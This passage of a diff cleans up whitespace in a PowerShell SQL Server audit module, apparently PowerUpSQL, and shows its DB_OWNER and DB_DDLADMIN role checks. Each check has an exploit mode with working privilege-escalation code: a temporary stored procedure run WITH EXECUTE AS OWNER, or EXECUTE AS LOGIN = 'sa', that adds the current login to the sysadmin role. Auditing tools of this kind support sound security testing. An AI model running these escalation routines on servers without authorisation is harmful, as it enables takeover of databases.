             a command like:  EXEC sp_droprolemember 'DB_OWNER', 'MyDbUser'
             Severity      : Medium
             IsVulnerable  : Yes
@@ -11689,44 +11713,44 @@ Function Invoke-SQLAuditRoleDbOwner
             Reference     : https://msdn.microsoft.com/en-us/library/ms189121.aspx,https://msdn.microsoft.com/en-us/library/ms187861.aspx
             Author        : Scott Sutherland (@_nullbind), NetSPI 2016
             .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditRoleDbOwner -Verbose 
+            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditRoleDbOwner -Verbose
     #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account to authenticate with.')]
         [string]$Username,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account password to authenticate with.')]
         [string]$Password,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
-        [string]$Instance,       
+        [string]$Instance,
 
         [Parameter(Mandatory = $false,
         HelpMessage = "Don't output anything.")]
         [string]$NoOutput,
-        
+
         [Parameter(Mandatory = $false,
         HelpMessage = 'Exploit vulnerable issues.')]
         [switch]$Exploit
     )
 
     Begin
-    {                 
+    {
         # Table for output
-        $TblData = New-Object -TypeName System.Data.DataTable 
+        $TblData = New-Object -TypeName System.Data.DataTable
         $null = $TblData.Columns.Add('ComputerName')
         $null = $TblData.Columns.Add('Instance')
         $null = $TblData.Columns.Add('Vulnerability')
@@ -11737,15 +11761,15 @@ Function Invoke-SQLAuditRoleDbOwner
         $null = $TblData.Columns.Add('IsExploitable')
         $null = $TblData.Columns.Add('Exploited')
         $null = $TblData.Columns.Add('ExploitCmd')
-        $null = $TblData.Columns.Add('Details')    
-        $null = $TblData.Columns.Add('Reference')   
-        $null = $TblData.Columns.Add('Author')   
+        $null = $TblData.Columns.Add('Details')
+        $null = $TblData.Columns.Add('Reference')
+        $null = $TblData.Columns.Add('Author')
     }
 
     Process
-    {   
+    {
         # Status User
-        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER" 
+        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER"
 
         # Test connection to server
         $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
@@ -11755,7 +11779,7 @@ Function Invoke-SQLAuditRoleDbOwner
         {
             # Status user
             Write-Verbose -Message "$Instance : CONNECTION FAILED"
-            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER"           
+            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER"
             Return
         }
         else
@@ -11764,20 +11788,20 @@ Function Invoke-SQLAuditRoleDbOwner
         }
 
         # Grab server, login, and role information
-        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose 
-        $ComputerName = $ServerInfo.ComputerName                
-        $CurrentLogin = $ServerInfo.CurrentLogin        
-        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin  -SuppressVerbose              
+        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+        $ComputerName = $ServerInfo.ComputerName
+        $CurrentLogin = $ServerInfo.CurrentLogin
+        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin  -SuppressVerbose
         $CurrentPrincpalList = @()
-        $CurrentPrincpalList += $CurrentLogin       
+        $CurrentPrincpalList += $CurrentLogin
         $CurrentPrincpalList += 'Public'
         $CurrentLoginRoles | ForEach-Object -Process {
             $CurrentPrincpalList += $_.RolePrincipalName
-        }        
-        
-        # --------------------------------------------     
+        }
+
+        # --------------------------------------------
         # Set function meta data for report output
-        # --------------------------------------------  
+        # --------------------------------------------
         if($Exploit)
         {
             $TestMode  = 'Exploit'
@@ -11785,13 +11809,13 @@ Function Invoke-SQLAuditRoleDbOwner
         else
         {
             $TestMode  = 'Audit'
-        }       
+        }
         $Vulnerability = 'DATABASE ROLE - DB_OWNER'
         $Description   = 'The login has the DB_OWER role in one or more databases.  This may allow the login to escalate privileges to sysadmin if the affected databases are trusted and owned by a sysadmin.'
         $Remediation   = "If the permission is not required remove it.  Permissions are granted with a command like: EXEC sp_addrolemember 'DB_OWNER', 'MyDbUser', and can be removed with a command like:  EXEC sp_droprolemember 'DB_OWNER', 'MyDbUser'"
-        $Severity      = 'Medium' 
+        $Severity      = 'Medium'
         $IsVulnerable  = 'No'
-        $IsExploitable = 'No' 
+        $IsExploitable = 'No'
         $Exploited     = 'No'
         if($Username)
         {
@@ -11801,15 +11825,15 @@ Function Invoke-SQLAuditRoleDbOwner
         {
             $ExploitCmd    = "Invoke-SQLAuditRoleDbOwner -Instance $Instance -Exploit"
         }
-        $Details       = ''   
+        $Details       = ''
         $Dependancies = 'Affected databases must be owned by a sysadmin and be trusted.'
-        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms189121.aspx,https://msdn.microsoft.com/en-us/library/ms187861.aspx'       
-        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016' 
-        
-        # -----------------------------------------------------------------     
+        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms189121.aspx,https://msdn.microsoft.com/en-us/library/ms187861.aspx'
+        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'
+
+        # -----------------------------------------------------------------
         # Check for the Vulnerability
         # Note: Typically a missing patch or weak configuration
-        # -----------------------------------------------------------------         
+        # -----------------------------------------------------------------
 
         # Iterate through each current login and their associated roles
         $CurrentPrincpalList|
@@ -11817,12 +11841,12 @@ Function Invoke-SQLAuditRoleDbOwner
             # Check if login or role has the DB_OWNER roles in any databases
             $DBOWNER = Get-SQLDatabaseRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -RolePrincipalName DB_OWNER -PrincipalName $_ -SuppressVerbose
 
-            # -----------------------------------------------------------------     
-            # Check for exploit dependancies 
+            # -----------------------------------------------------------------
+            # Check for exploit dependancies
             # Note: Typically secondary configs required for dba/os execution
             # -----------------------------------------------------------------
-            
-            # Check for db ownerships  
+
+            # Check for db ownerships
             if($DBOWNER)
             {
                 # Add an entry for each database where the user has the db_owner role
@@ -11834,29 +11858,29 @@ Function Invoke-SQLAuditRoleDbOwner
                     Write-Verbose -Message "$Instance : - $PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database."
                     $IsVulnerable = 'Yes'
 
-                    # Check if associated database is trusted and the owner is a sysadmin                  
+                    # Check if associated database is trusted and the owner is a sysadmin
                     $Depends = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseTarget -SuppressVerbose | Where-Object -FilterScript {
                         $_.is_trustworthy_on -eq 1 -and $_.OwnerIsSysadmin -eq 1
-                    } 
+                    }
 
                     if($Depends)
                     {
                         $IsExploitable = 'Yes'
                         Write-Verbose -Message "$Instance : - The $DatabaseTarget database is set as trustworthy and is owned by a sysadmin. This is exploitable."
-                        
-                        # -----------------------------------------------------------------    
+
+                        # -----------------------------------------------------------------
                         # Exploit Vulnerability
                         # Note: Add the current user to sysadmin fixed server role
-                        # -----------------------------------------------------------------                     
+                        # -----------------------------------------------------------------
                         if($Exploit)
                         {
                             # Check if user is already a sysadmin
-                            $SysadminPreCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status                                            
+                            $SysadminPreCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
                             if($SysadminPreCheck -eq 0)
                             {
                                 # Status user
                                 Write-Verbose -Message "$Instance : - EXPLOITING: Verified that the current user ($CurrentLogin) is NOT a sysadmin."
-                                Write-Verbose -Message "$Instance : - EXPLOITING: Attempting to add the current user ($CurrentLogin) to the sysadmin role by using DB_OWNER permissions..."                            
+                                Write-Verbose -Message "$Instance : - EXPLOITING: Attempting to add the current user ($CurrentLogin) to the sysadmin role by using DB_OWNER permissions..."
 
                                 $SpQuery = "CREATE PROCEDURE sp_elevate_me
                                     WITH EXECUTE AS OWNER
@@ -11864,18 +11888,18 @@ Function Invoke-SQLAuditRoleDbOwner
                                     begin
                                     EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin'
                                 end;"
-                                                        
+
                                 # Add sp_elevate_me stored procedure
-                                Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "$SpQuery" -SuppressVerbose -Database $DatabaseTarget | Out-Null                                              
+                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "$SpQuery" -SuppressVerbose -Database $DatabaseTarget
 
                                 # Run sp_elevate_me stored procedure
-                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query 'sp_elevate_me' -SuppressVerbose -Database $DatabaseTarget                                              
+                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query 'sp_elevate_me' -SuppressVerbose -Database $DatabaseTarget
 
                                 # Remove sp_elevate_me stored procedure
-                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query 'DROP PROC sp_elevate_me' -SuppressVerbose -Database $DatabaseTarget                                              
+                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query 'DROP PROC sp_elevate_me' -SuppressVerbose -Database $DatabaseTarget
 
                                 # Verify the login was added successfully
-                                $SysadminPostCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status               
+                                $SysadminPostCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
                                 if($SysadminPostCheck -eq 1)
                                 {
                                     Write-Verbose -Message "$Instance : - EXPLOITING: It was possible to make the current user ($CurrentLogin) a sysadmin!"
@@ -11884,42 +11908,42 @@ Function Invoke-SQLAuditRoleDbOwner
                                 else
                                 {
 
-                                }                                                      
+                                }
                             }
                             else
                             {
                                 Write-Verbose -Message "$Instance : - EXPLOITING: It was not possible to make the current user ($CurrentLogin) a sysadmin."
                             }
-                           
+
                             #Add record
                             $Details = "$PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database."
-                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)                                                                   
+                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                         }
                         else
                         {
-                            #Add record                            
-                            $Details = "$PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database."                            
-                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)                                                                   
-                        }                    
+                            #Add record
+                            $Details = "$PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database."
+                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
+                        }
                     }
                     else
                     {
                         #Add record
                         Write-Verbose -Message "$Instance : - The $DatabaseTarget is not exploitable."
                         $Details = "$PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database, but this was not exploitable."
-                        $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)                                                                   
+                        $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                     }
                 }
-            }                                                                                     
-        }                                  
-                                                    
+            }
+        }
+
         # Status User
-        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER" 
+        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER"
     }
 
     End
-    {   
-        # Return data  
+    {
+        # Return data
         if ( -not $NoOutput)
         {
             Return $TblData
@@ -11932,19 +11956,19 @@ Function Invoke-SQLAuditRoleDbOwner
 # Invoke-SQLAuditRoleDbDdlAdmin
 # ---------------------------------------
 # Author: Scott Sutherland
-Function Invoke-SQLAuditRoleDbDdlAdmin 
+Function Invoke-SQLAuditRoleDbDdlAdmin
 {
     <#
             .SYNOPSIS
             Check if the current user has the db_ddladmin role in any databases.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER Exploit
             Exploit vulnerable issues.
             .EXAMPLE
@@ -11953,9 +11977,9 @@ Function Invoke-SQLAuditRoleDbDdlAdmin
             ComputerName  : SQLServer1
             Instance      : SQLServer1\STANDARDDEV2014
             Vulnerability : DATABASE ROLE - DB_DDLADMIN
-            Description   : The login has the DB_DDLADMIN role in one or more databases.  This may allow the login to escalate privileges to sysadmin if the affected databases are trusted 
+            Description   : The login has the DB_DDLADMIN role in one or more databases.  This may allow the login to escalate privileges to sysadmin if the affected databases are trusted
             and owned by a sysadmin, or if a custom assembly can be loaded.
-            Remediation   : If the permission is not required remove it.  Permissions are granted with a command like: EXEC sp_addrolemember 'DB_DDLADMIN', 'MyDbUser', and can be removed 
+            Remediation   : If the permission is not required remove it.  Permissions are granted with a command like: EXEC sp_addrolemember 'DB_DDLADMIN', 'MyDbUser', and can be removed
             with a command like:  EXEC sp_droprolemember 'DB_DDLADMIN', 'MyDbUser'
             Severity      : Medium
             IsVulnerable  : Yes
@@ -11966,44 +11990,44 @@ Function Invoke-SQLAuditRoleDbDdlAdmin
             Reference     : https://technet.microsoft.com/en-us/library/ms189612(v=sql.105).aspx
             Author        : Scott Sutherland (@_nullbind), NetSPI 2016
             .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditRoleDbDdlAdmin -Verbose 
+            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditRoleDbDdlAdmin -Verbose
     #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account to authenticate with.')]
         [string]$Username,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account password to authenticate with.')]
         [string]$Password,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
-        [string]$Instance,       
+        [string]$Instance,
 
         [Parameter(Mandatory = $false,
         HelpMessage = "Don't output anything.")]
         [string]$NoOutput,
-        
+
         [Parameter(Mandatory = $false,
         HelpMessage = 'Exploit vulnerable issues.')]
         [switch]$Exploit
     )
 
     Begin
-    {                 
+    {
         # Table for output
-        $TblData = New-Object -TypeName System.Data.DataTable 
+        $TblData = New-Object -TypeName System.Data.DataTable
         $null = $TblData.Columns.Add('ComputerName')
         $null = $TblData.Columns.Add('Instance')
         $null = $TblData.Columns.Add('Vulnerability')
@@ -12014,15 +12038,15 @@ Function Invoke-SQLAuditRoleDbDdlAdmin
         $null = $TblData.Columns.Add('IsExploitable')
         $null = $TblData.Columns.Add('Exploited')
         $null = $TblData.Columns.Add('ExploitCmd')
-        $null = $TblData.Columns.Add('Details')    
-        $null = $TblData.Columns.Add('Reference')   
-        $null = $TblData.Columns.Add('Author')   
+        $null = $TblData.Columns.Add('Details')
+        $null = $TblData.Columns.Add('Reference')
+        $null = $TblData.Columns.Add('Author')
     }
 
     Process
-    {   
+    {
         # Status User
-        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: DATABASE ROLE - DB_DDLAMDIN" 
+        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: DATABASE ROLE - DB_DDLAMDIN"
 
         # Test connection to server
         $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
@@ -12032,7 +12056,7 @@ Function Invoke-SQLAuditRoleDbDdlAdmin
         {
             # Status user
             Write-Verbose -Message "$Instance : CONNECTION FAILED"
-            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_DDLADMIN"           
+            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_DDLADMIN"
             Return
         }
         else
@@ -12041,20 +12065,20 @@ Function Invoke-SQLAuditRoleDbDdlAdmin
         }
 
         # Grab server, login, and role information
-        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose 
-        $ComputerName = $ServerInfo.ComputerName                
-        $CurrentLogin = $ServerInfo.CurrentLogin        
-        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin  -SuppressVerbose              
+        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+        $ComputerName = $ServerInfo.ComputerName
+        $CurrentLogin = $ServerInfo.CurrentLogin
+        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin  -SuppressVerbose
         $CurrentPrincpalList = @()
-        $CurrentPrincpalList += $CurrentLogin       
+        $CurrentPrincpalList += $CurrentLogin
         $CurrentPrincpalList += 'Public'
         $CurrentLoginRoles | ForEach-Object -Process {
             $CurrentPrincpalList += $_.RolePrincipalName
-        }        
-        
-        # --------------------------------------------     
+        }
+
+        # --------------------------------------------
         # Set function meta data for report output
-        # --------------------------------------------  
+        # --------------------------------------------
         if($Exploit)
         {
             $TestMode  = 'Exploit'
@@ -12062,24 +12086,24 @@ Function Invoke-SQLAuditRoleDbDdlAdmin
         else
         {
             $TestMode  = 'Audit'
-        }       
+        }
         $Vulnerability = 'DATABASE ROLE - DB_DDLADMIN'
         $Description   = 'The login has the DB_DDLADMIN role in one or more databases.  This may allow the login to escalate privileges to sysadmin if the affected databases are trusted and owned by a sysadmin, or if a custom assembly can be loaded.'
         $Remediation   = "If the permission is not required remove it.  Permissions are granted with a command like: EXEC sp_addrolemember 'DB_DDLADMIN', 'MyDbUser', and can be removed with a command like:  EXEC sp_droprolemember 'DB_DDLADMIN', 'MyDbUser'"
-        $Severity      = 'Medium' 
+        $Severity      = 'Medium'
         $IsVulnerable  = 'No'
-        $IsExploitable = 'No' 
+        $IsExploitable = 'No'
         $Exploited     = 'No'
         $ExploitCmd    = 'No exploit command is available at this time, but a custom assesmbly could be used.'
-        $Details       = ''   
+        $Details       = ''
         $Dependancies  = 'Affected databases must be owned by a sysadmin and be trusted. Or it must be possible to load a custom assembly configured for external access.'
-        $Reference     = 'https://technet.microsoft.com/en-us/library/ms189612(v=sql.105).aspx'       
-        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016' 
-        
-        # -----------------------------------------------------------------     
+        $Reference     = 'https://technet.microsoft.com/en-us/library/ms189612(v=sql.105).aspx'
+        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'
+
+        # -----------------------------------------------------------------
         # Check for the Vulnerability
         # Note: Typically a missing patch or weak configuration
-        # -----------------------------------------------------------------         
+        # -----------------------------------------------------------------
 
         # Iterate through each current login and their associated roles
         $CurrentPrincpalList|
@@ -12087,12 +12111,12 @@ Function Invoke-SQLAuditRoleDbDdlAdmin
             # Check if login or role has the DB_DDLADMIN roles in any databases
             $DBDDLADMIN = Get-SQLDatabaseRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -RolePrincipalName DB_DDLADMIN -PrincipalName $_ -SuppressVerbose
 
-            # -----------------------------------------------------------------     
-            # Check for exploit dependancies 
+            # -----------------------------------------------------------------
+            # Check for exploit dependancies
             # Note: Typically secondary configs required for dba/os execution
             # -----------------------------------------------------------------
-            
-            # Check for db ownerships  
+
+            # Check for db ownerships
             if($DBDDLADMIN)
             {
                 # Add an entry for each database where the user has the DB_DDLADMIN role
@@ -12104,35 +12128,35 @@ Function Invoke-SQLAuditRoleDbDdlAdmin
                     Write-Verbose -Message "$Instance : - $PrincipalTarget has the DB_DDLADMIN role in the $DatabaseTarget database."
                     $IsVulnerable = 'Yes'
 
-                    # Check if associated database is trusted and the owner is a sysadmin                  
+                    # Check if associated database is trusted and the owner is a sysadmin
                     $Depends = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseTarget -SuppressVerbose | Where-Object -FilterScript {
                         $_.is_trustworthy_on -eq 1 -and $_.OwnerIsSysadmin -eq 1
-                    } 
+                    }
 
                     if($Depends)
                     {
                         $IsExploitable = 'No'
                         Write-Verbose -Message "$Instance : - The $DatabaseTarget database is set as trustworthy and is owned by a sysadmin. This is exploitable."
-                        
-                        # -----------------------------------------------------------------    
+
+                        # -----------------------------------------------------------------
                         # Exploit Vulnerability
                         # Note: Add the current user to sysadmin fixed server role
-                        # -----------------------------------------------------------------                     
+                        # -----------------------------------------------------------------
                         if($Exploit)
                         {
                             # Check if user is already a sysadmin
-                            $SysadminPreCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status                                            
+                            $SysadminPreCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
                             if($SysadminPreCheck -eq 0)
                             {
                                 # Status user
                                 Write-Verbose -Message "$Instance : - EXPLOITING: Verified that the current user ($CurrentLogin) is NOT a sysadmin."
-                                Write-Verbose -Message "$Instance : - EXPLOITING: Attempting to add the current user ($CurrentLogin) to the sysadmin role by using DB_OWNER permissions..."                            
-                                                        
+                                Write-Verbose -Message "$Instance : - EXPLOITING: Attempting to add the current user ($CurrentLogin) to the sysadmin role by using DB_OWNER permissions..."
+
                                 # Attempt to add the current login to sysadmins fixed server role
-                                Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin';Revert" -SuppressVerbose | Out-Null                                              
+                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin';Revert" -SuppressVerbose
 
                                 # Verify the login was added successfully
-                                $SysadminPostCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status               
+                                $SysadminPostCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
                                 if($SysadminPostCheck -eq 1)
                                 {
                                     Write-Verbose -Message "$Instance : - EXPLOITING: It was possible to make the current user ($CurrentLogin) a sysadmin!"
@@ -12141,42 +12165,42 @@ Function Invoke-SQLAuditRoleDbDdlAdmin
                                 else
                                 {
 
-                                }                                                      
+                                }
                             }
                             else
                             {
                                 Write-Verbose -Message "$Instance : - EXPLOITING: It was not possible to make the current user ($CurrentLogin) a sysadmin."
                             }
-                           
+
                             #Add record
                             $Details = "$PrincipalTarget has the DB_DDLADMIN role in the $DatabaseTarget database."
-                            $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author) | Out-Null                                                                   
+                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                         }
                         else
                         {
-                            #Add record                            
-                            $Details = "$PrincipalTarget has the DB_DDLADMIN role in the $DatabaseTarget database."                            
-                            $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author) | Out-Null                                                                   
-                        }                    
+                            #Add record
+                            $Details = "$PrincipalTarget has the DB_DDLADMIN role in the $DatabaseTarget database."
+                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
+                        }
                     }
                     else
                     {
                         #Add record
                         Write-Verbose -Message "$Instance : - The $DatabaseTarget is not exploitable."
                         $Details = "$PrincipalTarget has the DB_DDLADMIN role in the $DatabaseTarget database, but this was not exploitable."
-                        $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author) | Out-Null                                                                   
+                        $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                     }
                 }
-            }                                                                                     
-        }                                  
-                                                    
+            }
+        }
+
         # Status User
-        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_DDLADMIN" 
+        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_DDLADMIN"
     }
 
     End
-    {   
-        # Return data  
+    {
+        # Return data
         if ( -not $NoOutput)
         {
             Return $TblData
@@ -12189,19 +12213,19 @@ Function Invoke-SQLAuditRoleDbDdlAdmin
 # Invoke-SQLAuditPrivImpersonateLogin
 # -----------------------------------
 # Author: Scott Sutherland
-Function Invoke-SQLAuditPrivImpersonateLogin 
+Function Invoke-SQLAuditPrivImpersonateLogin
 {
     <#
             .SYNOPSIS
             Check if the current login has the IMPERSONATE permission on any sysadmin logins. Attempt to use permission to obtain sysadmin privileges.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER NoOutput
             Don't output anything.
             .PARAMETER Exploit
@@ -12213,7 +12237,7 @@ Function Invoke-SQLAuditPrivImpersonateLogin
             Instance      : SQLServer1\STANDARDDEV2014
             Vulnerability : PERMISSION - IMPERSONATE LOGIN
             Description   : The current SQL Server login can impersonate other logins.  This may allow an authenticated login to gain additional privileges.
-            Remediation   : Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON 
+            Remediation   : Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON
             Login::sa to [user]. It can be removed using a command like: REVOKE IMPERSONATE ON Login::sa to [user]
             Severity      : High
             IsVulnerable  : Yes
@@ -12230,7 +12254,7 @@ Function Invoke-SQLAuditPrivImpersonateLogin
             Instance      : SQLServer1\STANDARDDEV2014
             Vulnerability : PERMISSION - IMPERSONATE LOGIN
